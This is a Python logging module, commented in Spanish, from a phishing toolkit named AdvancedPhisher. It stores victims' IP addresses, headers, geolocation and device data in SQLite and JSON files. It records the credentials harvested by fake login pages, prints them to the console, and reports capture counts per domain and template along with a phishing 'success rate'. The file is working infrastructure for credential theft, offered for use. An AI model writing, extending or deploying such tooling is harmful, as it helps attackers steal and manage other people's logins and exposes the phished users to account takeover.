#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Logger - Sistema de logging avanzado y reportes
Parte del framework AdvancedPhisher
"""

import os
import json
import csv
import sqlite3
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Any
from colorama import Fore, Style
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from tabulate import tabulate

class Logger:
    def __init__(self, config=None):
        self.base_dir = Path(__file__).parent.parent
        self.logs_dir = self.base_dir / "logs"
        self.reports_dir = self.base_dir / "reports"
        
        # Crear directorios si no existen
        self.logs_dir.mkdir(exist_ok=True)
        self.reports_dir.mkdir(exist_ok=True)
        
        self.config = config or {}
        self.console = Console()
        
        # Inicializar base de datos SQLite
        self.db_path = self.logs_dir / "phisher.db"
        self.init_database()
        
        # Archivos de log
        self.visits_log = self.logs_dir / "visits.json"
        self.captures_log = self.logs_dir / "captures.json"
        self.errors_log = self.logs_dir / "errors.json"
        self.system_log = self.logs_dir / "system.json"
        
    def init_database(self):
        """Inicializar base de datos SQLite"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            # Tabla de visitas
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS visits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    ip TEXT NOT NULL,
                    user_agent TEXT,
                    referer TEXT,
                    path TEXT,
                    method TEXT,
                    domain TEXT,
                    template TEXT,
                    headers TEXT,
                    geo_info TEXT,
                    device_info TEXT
                )
            ''')
            
            # Tabla de capturas
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS captures (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    ip TEXT NOT NULL,
                    user_agent TEXT,
                    domain TEXT,
                    template TEXT,
                    credentials TEXT NOT NULL,
                    headers TEXT,
                    success BOOLEAN DEFAULT 1
                )
            ''')
            
            # Tabla de errores
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS errors (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    level TEXT NOT NULL,
                    message TEXT NOT NULL,
                    module TEXT,
                    traceback TEXT
                )
            ''')
            
            # Tabla de eventos del sistema
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS system_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    event_type TEXT NOT NULL,
                    description TEXT,
                    data TEXT
                )
            ''')
            
            # Índices para mejorar rendimiento
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_visits_timestamp ON visits(timestamp)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_visits_ip ON visits(ip)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_captures_timestamp ON captures(timestamp)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_captures_ip ON captures(ip)')
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}Error inicializando base de datos: {str(e)}{Style.RESET_ALL}")
            
    def log_visit(self, visit_data: Dict[str, Any]):
        """Registrar visita"""
        try:
            # Log a archivo JSON
            self._append_to_json_log(self.visits_log, visit_data)
            
            # Log a base de datos
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO visits (
                    timestamp, ip, user_agent, referer, path, method, 
                    domain, template, headers, geo_info, device_info
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                visit_data.get('timestamp'),
                visit_data.get('ip'),
                visit_data.get('user_agent'),
                visit_data.get('referer'),
                visit_data.get('path'),
                visit_data.get('method'),
                visit_data.get('domain'),
                visit_data.get('template'),
                json.dumps(visit_data.get('headers', {})),
                json.dumps(visit_data.get('geo_info', {})),
                json.dumps(visit_data.get('device_info', {}))
            ))
            
            conn.commit()
            conn.close()
            
            # Log a consola si está habilitado
            if self.config.get('console_logging', True):
                print(f"{Fore.BLUE}[VISIT] {visit_data.get('ip')} -> {visit_data.get('path')}{Style.RESET_ALL}")
                
        except Exception as e:
            self.error(f"Error logging visit: {str(e)}")
            
    def log_capture(self, capture_data: Dict[str, Any]):
        """Registrar captura de credenciales"""
        try:
            # Log a archivo JSON
            self._append_to_json_log(self.captures_log, capture_data)
            
            # Log a base de datos
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO captures (
                    timestamp, ip, user_agent, domain, template, 
                    credentials, headers, success
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                capture_data.get('timestamp'),
                capture_data.get('ip'),
                capture_data.get('user_agent'),
                capture_data.get('domain'),
                capture_data.get('template'),
                json.dumps(capture_data.get('credentials', {})),
                json.dumps(capture_data.get('headers', {})),
                True
            ))
            
            conn.commit()
            conn.close()
            
            # Log a consola
            print(f"{Fore.GREEN}[CAPTURE] {capture_data.get('ip')} -> {capture_data.get('domain')}{Style.RESET_ALL}")
            
            # Mostrar credenciales capturadas
            credentials = capture_data.get('credentials', {})
            for field, value in credentials.items():
                print(f"{Fore.YELLOW}  {field}: {value}{Style.RESET_ALL}")
                
        except Exception as e:
            self.error(f"Error logging capture: {str(e)}")
            
    def info(self, message: str, module: str = None):
        """Log mensaje informativo"""
        self._log_message('INFO', message, module)
        
    def warning(self, message: str, module: str = None):
        """Log mensaje de advertencia"""
        self._log_message('WARNING', message, module)
        print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
        
    def error(self, message: str, module: str = None, traceback: str = None):
        """Log mensaje de error"""
        self._log_message('ERROR', message, module, traceback)
        print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
        
    def critical(self, message: str, module: str = None, traceback: str = None):
        """Log mensaje crítico"""
        self._log_message('CRITICAL', message, module, traceback)
        print(f"{Fore.RED}[CRITICAL] {message}{Style.RESET_ALL}")
        
    def system_event(self, event_type: str, description: str, data: Dict = None):
        """Registrar evento del sistema"""
        try:
            event_data = {
                'timestamp': datetime.now().isoformat(),
                'event_type': event_type,
                'description': description,
                'data': data or {}
            }
            
            # Log a archivo JSON
            self._append_to_json_log(self.system_log, event_data)
            
            # Log a base de datos
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO system_events (timestamp, event_type, description, data)
                VALUES (?, ?, ?, ?)
            ''', (
                event_data['timestamp'],
                event_type,
                description,
                json.dumps(data or {})
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}Error logging system event: {str(e)}{Style.RESET_ALL}")
            
    def _log_message(self, level: str, message: str, module: str = None, traceback: str = None):
        """Log mensaje genérico"""
        try:
            log_data = {
                'timestamp': datetime.now().isoformat(),
                'level': level,
                'message': message,
                'module': module,
                'traceback': traceback
            }
            
            # Log a archivo JSON
            self._append_to_json_log(self.errors_log, log_data)
            
            # Log a base de datos
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO errors (timestamp, level, message, module, traceback)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                log_data['timestamp'],
                level,
                message,
                module,
                traceback
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"{Fore.RED}Error in _log_message: {str(e)}{Style.RESET_ALL}")
            
    def _append_to_json_log(self, file_path: Path, data: Dict):
        """Agregar datos a archivo JSON log"""
        try:
            # Leer datos existentes
            if file_path.exists():
                with open(file_path, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            else:
                logs = []
                
            # Agregar nuevo log
            logs.append(data)
            
            # Mantener solo los últimos N logs
            max_logs = self.config.get('max_logs_per_file', 10000)
            if len(logs) > max_logs:
                logs = logs[-max_logs:]
                
            # Escribir de vuelta
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(logs, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            print(f"{Fore.RED}Error writing to log file {file_path}: {str(e)}{Style.RESET_ALL}")
            
    def get_visits_stats(self, hours: int = 24) -> Dict:
        """Obtener estadísticas de visitas"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            # Fecha límite
            since = (datetime.now() - timedelta(hours=hours)).isoformat()
            
            # Total de visitas
            cursor.execute('SELECT COUNT(*) FROM visits WHERE timestamp > ?', (since,))
            total_visits = cursor.fetchone()[0]
            
            # Visitas únicas por IP
            cursor.execute('SELECT COUNT(DISTINCT ip) FROM visits WHERE timestamp > ?', (since,))
            unique_visitors = cursor.fetchone()[0]
            
            # Top IPs
            cursor.execute('''
                SELECT ip, COUNT(*) as count 
                FROM visits 
                WHERE timestamp > ? 
                GROUP BY ip 
                ORDER BY count DESC 
                LIMIT 10
            ''', (since,))
            top_ips = cursor.fetchall()
            
            # Top User Agents
            cursor.execute('''
                SELECT user_agent, COUNT(*) as count 
                FROM visits 
                WHERE timestamp > ? AND user_agent IS NOT NULL 
                GROUP BY user_agent 
                ORDER BY count DESC 
                LIMIT 5
            ''', (since,))
            top_user_agents = cursor.fetchall()
            
            conn.close()
            
            return {
                'total_visits': total_visits,
                'unique_visitors': unique_visitors,
                'top_ips': top_ips,
                'top_user_agents': top_user_agents,
                'period_hours': hours
            }
            
        except Exception as e:
            self.error(f"Error getting visits stats: {str(e)}")
            return {}
            
    def get_captures_stats(self, hours: int = 24) -> Dict:
        """Obtener estadísticas de capturas"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            # Fecha límite
            since = (datetime.now() - timedelta(hours=hours)).isoformat()
            
            # Total de capturas
            cursor.execute('SELECT COUNT(*) FROM captures WHERE timestamp > ?', (since,))
            total_captures = cursor.fetchone()[0]
            
            # Capturas por dominio
            cursor.execute('''
                SELECT domain, COUNT(*) as count 
                FROM captures 
                WHERE timestamp > ? 
                GROUP BY domain 
                ORDER BY count DESC
            ''', (since,))
            captures_by_domain = cursor.fetchall()
            
            # Capturas por template
            cursor.execute('''
                SELECT template, COUNT(*) as count 
                FROM captures 
                WHERE timestamp > ? 
                GROUP BY template 
                ORDER BY count DESC
            ''', (since,))
            captures_by_template = cursor.fetchall()
            
            conn.close()
            
            return {
                'total_captures': total_captures,
                'captures_by_domain': captures_by_domain,
                'captures_by_template': captures_by_template,
                'period_hours': hours
            }
            
        except Exception as e:
            self.error(f"Error getting captures stats: {str(e)}")
            return {}
            
    def generate_report(self, format_type: str = 'console', hours: int = 24) -> str:
        """Generar reporte de actividad"""
        try:
            visits_stats = self.get_visits_stats(hours)
            captures_stats = self.get_captures_stats(hours)
            
            if format_type == 'console':
                return self._generate_console_report(visits_stats, captures_stats)
            elif format_type == 'json':
                return self._generate_json_report(visits_stats, captures_stats)
            elif format_type == 'csv':
                return self._generate_csv_report(visits_stats, captures_stats)
            elif format_type == 'html':
                return self._generate_html_report(visits_stats, captures_stats)
            else:
                return "Formato no soportado"
                
        except Exception as e:
            self.error(f"Error generating report: {str(e)}")
            return f"Error generando reporte: {str(e)}"
            
    def _generate_console_report(self, visits_stats: Dict, captures_stats: Dict) -> str:
        """Generar reporte para consola"""
        report = []
        
        # Header
        report.append(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        report.append(f"{Fore.CYAN}           REPORTE DE ACTIVIDAD - ADVANCEDPHISHER{Style.RESET_ALL}")
        report.append(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        report.append(f"Período: Últimas {visits_stats.get('period_hours', 24)} horas")
        report.append(f"Generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")
        
        # Estadísticas de visitas
        report.append(f"{Fore.GREEN}📊 ESTADÍSTICAS DE VISITAS{Style.RESET_ALL}")
        report.append(f"Total de visitas: {visits_stats.get('total_visits', 0)}")
        report.append(f"Visitantes únicos: {visits_stats.get('unique_visitors', 0)}")
        report.append("")
        
        # Top IPs
        if visits_stats.get('top_ips'):
            report.append(f"{Fore.YELLOW}🔝 TOP IPs{Style.RESET_ALL}")
            for ip, count in visits_stats['top_ips']:
                report.append(f"  {ip}: {count} visitas")
            report.append("")
            
        # Estadísticas de capturas
        report.append(f"{Fore.RED}🎯 ESTADÍSTICAS DE CAPTURAS{Style.RESET_ALL}")
        report.append(f"Total de capturas: {captures_stats.get('total_captures', 0)}")
        
        # Tasa de éxito
        if visits_stats.get('total_visits', 0) > 0:
            success_rate = (captures_stats.get('total_captures', 0) / visits_stats['total_visits']) * 100
            report.append(f"Tasa de éxito: {success_rate:.2f}%")
        report.append("")
        
        # Capturas por dominio
        if captures_stats.get('captures_by_domain'):
            report.append(f"{Fore.MAGENTA}🌐 CAPTURAS POR DOMINIO{Style.RESET_ALL}")
            for domain, count in captures_stats['captures_by_domain']:
                report.append(f"  {domain}: {count} capturas")
            report.append("")
            
        return "\n".join(report)
        
    def _generate_json_report(self, visits_stats: Dict, captures_stats: Dict) -> str:
        """Generar reporte en formato JSON"""
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'period_hours': visits_stats.get('period_hours', 24),
            'visits': visits_stats,
            'captures': captures_stats
        }
        
        return json.dumps(report_data, indent=2, ensure_ascii=False)
        
    def _generate_csv_report(self, visits_stats: Dict, captures_stats: Dict) -> str:
        """Generar reporte en formato CSV"""
        # Implementación básica - se puede expandir
        return "CSV report not implemented yet"
        
    def _generate_html_report(self, visits_stats: Dict, captures_stats: Dict) -> str:
        """Generar reporte en formato HTML"""
        # Implementación básica - se puede expandir
        return "HTML report not implemented yet"
        
    def export_data(self, format_type: str, output_file: str, hours: int = 24) -> bool:
        """Exportar datos a archivo"""
        try:
            report = self.generate_report(format_type, hours)
            
            output_path = self.reports_dir / output_file
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(report)
                
            print(f"{Fore.GREEN}[+] Reporte exportado a: {output_path}{Style.RESET_ALL}")
            return True
            
        except Exception as e:
            self.error(f"Error exporting data: {str(e)}")
            return False
            
    def clear_logs(self, older_than_days: int = 30) -> bool:
        """Limpiar logs antiguos"""
        try:
            cutoff_date = (datetime.now() - timedelta(days=older_than_days)).isoformat()
            
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            # Eliminar registros antiguos
            cursor.execute('DELETE FROM visits WHERE timestamp < ?', (cutoff_date,))
            cursor.execute('DELETE FROM captures WHERE timestamp < ?', (cutoff_date,))
            cursor.execute('DELETE FROM errors WHERE timestamp < ?', (cutoff_date,))
            cursor.execute('DELETE FROM system_events WHERE timestamp < ?', (cutoff_date,))
            
            # Optimizar base de datos
            cursor.execute('VACUUM')
            
            conn.commit()
            conn.close()
            
            print(f"{Fore.GREEN}[+] Logs limpiados (más de {older_than_days} días){Style.RESET_ALL}")
            return True
            
        except Exception as e:
            self.error(f"Error clearing logs: {str(e)}")
            return False